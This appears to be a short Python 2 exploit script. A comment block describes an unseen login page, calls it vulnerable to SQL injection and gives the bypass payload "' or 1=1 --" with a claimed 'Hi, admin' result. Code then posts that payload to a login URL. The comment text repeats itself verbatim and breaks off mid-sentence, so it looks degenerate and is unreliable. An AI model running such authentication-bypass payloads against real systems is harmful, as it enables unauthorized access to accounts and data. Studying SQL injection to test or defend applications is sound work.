
#
#1. It is connecting to the database using the credentials provided in the code.
#2. It is executing a query to fetch the user details from the database.
#3. It is checking if the user exists in the database.
#4. If the user exists, it is displaying the user's name.
#
#The above code is vulnerable to SQL injection.
#
#The following payload can be used to exploit the above vulnerability:
#
#username: ' or 1=1 --
#password: anything
#
#The above payload will return the following output:
#
#Hi, admin
#
#The above output confirms that the above payload is successful.
#
#The following payload can be used to exploit the above vulnerability:
#
#username: ' or 1=1 --
#password: anything
#
#The above payload will return the following output:
#
#Hi, admin
#
#The above output confirms that the above payload is successful.
#
#The following payload can be used to

import urllib
import urllib2

url = "http://example.com/login.php"

values = {'username' : "' or 1=1 --",
          'password' : 'anything' }

data = urllib.urlencode(values)
req = urllib2.Request(url, data)
response = urllib2.urlopen(req)
the_page = response.read()